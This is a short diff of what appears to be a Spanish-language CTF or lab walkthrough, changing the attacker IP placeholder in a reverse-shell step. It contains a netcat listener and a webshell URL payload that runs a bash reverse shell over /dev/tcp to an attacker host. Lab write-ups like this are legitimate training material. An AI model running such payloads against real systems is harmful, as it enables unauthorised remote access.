@@ -97,7 +97,7 @@ RCE como `www-data`. Subimos una reverse shell:
 nc -lvnp 4444
 
 # payload via webshell
-http://172.17.0.2/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/TU_IP/4444+0>%261'
+http://172.17.0.2/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.X/4444+0>%261'
 ```
 
 ---
